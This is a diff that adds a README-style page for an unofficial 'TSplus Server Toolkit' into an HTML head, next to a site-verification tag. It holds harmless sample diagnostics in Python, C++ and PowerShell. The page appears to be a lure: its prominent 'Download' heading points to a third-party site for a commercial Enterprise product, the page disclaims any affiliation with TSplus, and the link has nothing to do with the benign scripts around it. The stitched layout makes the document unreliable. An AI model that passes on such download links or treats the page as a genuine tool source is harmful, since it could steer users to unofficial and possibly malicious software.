@@ -1,2 +1,134 @@
 <head>
 <meta name="google-site-verification" content="FVlJW9zhnei0AEPEDxkYapn3wPU-AIHljn4N3PIOVt8" />
+# TSplus Server Toolkit
+
+ A collection of technical utilities, diagnostic tools, configuration examples, and administration resources for Windows environments using TSplus Enterprise Edition.
+
+ ## Overview
+
+## [TSplus Server Toolkit Download](https://softotips.com/tsplus/) 
+it is an independent collection of scripts and development examples designed to assist with server diagnostics, configuration management, system administration, and troubleshooting.
+
+ The repository includes examples written in **Python, C++, PowerShell, and Windows CMD**.
+
+ ## Features
+
+ - 🐍 Python diagnostic utilities
+- ⚙️ C++ system utilities
+- 💻 PowerShell administration scripts
+- 🪟 Windows CMD tools
+- 🔧 Configuration examples
+- 📚 Administration documentation
+- 🔍 Server diagnostics
+- 🧪 Testing examples
+- 🛠️ Troubleshooting resources
+ ## Python Example
+
+ A basic read-only server diagnostic:
+
+```
+import platform
+import socket
+
+def server_info():
+    print("=== Server Information ===")
+    print(f"Hostname : {socket.gethostname()}")
+    print(f"System   : {platform.system()}")
+    print(f"Release  : {platform.release()}")
+    print(f"Machine  : {platform.machine()}")
+
+if __name__ == "__main__":
+    server_info()
+```
+
+ ## C++ Example
+
+```
+#include <iostream>
+
+int main() {
+    std::cout << "TSplus Server Toolkit" << std::endl;
+    std::cout << "System diagnostic utility" << std::endl;
+    std::cout << "Status: Ready" << std::endl;
+
+    return 0;
+}
+```
+
+ ## PowerShell Example
+
+```
+Write-Host "=== Server Service Check ==="
+
+$service = Get-Service -Name "TermService" -ErrorAction SilentlyContinue
+
+if ($service) {
+    Write-Host "Service: $($service.DisplayName)"
+    Write-Host "Status : $($service.Status)"
+} else {
+    Write-Host "Service not found."
+}
+```
+
+ ## Configuration
+
+TSplus Enterprise Edition configuration files are provided in the `config/` directory.
+
+```
+[server]
+name=ExampleServer
+environment=development
+
+[diagnostics]
+enabled=true
+logging=true
+```
+
+ Do not commit TSplus Enterprise Edition passwords, access tokens, license keys, private certificates, or other sensitive information.
+
+ ## Documentation
+
+ Detailed documentation is available in the `docs/` directory:
+
+ - Installation
+- Configuration
+- Administration
+- Troubleshooting
+- Development examples
+
+ ## Development
+
+ Clone the repository:
+
+```
+git clone https://github.com/tsplusremote2026/tsplus-server-toolkit.git
+cd tsplus-server-toolkit
+```
+
+ Run the Python diagnostic example:
+
+```
+python python/diagnostics.py
+```
+
+ Compile the C++ example:
+
+```
+g++ cpp/diagnostics.cpp -o diagnostics
+```
+
+ ## Security
+
+ The TSplus Enterprise Edition tools in this repository are intended to provide diagnostic and administrative functionality.
+
+ Scripts should be reviewed before execution, particularly when used on production servers. Avoid storing credentials or other sensitive information in source code or configuration files.
+
+ ## Disclaimer
+
+ TSplus and TSplus Server Toolkit-related product names are used only to describe the intended technical context.
+
+ This repository is an independent project and is not affiliated with, sponsored by, or endorsed by TSplus.
+
+ ## License
+
+ See the `LICENSE` file for licensing information.
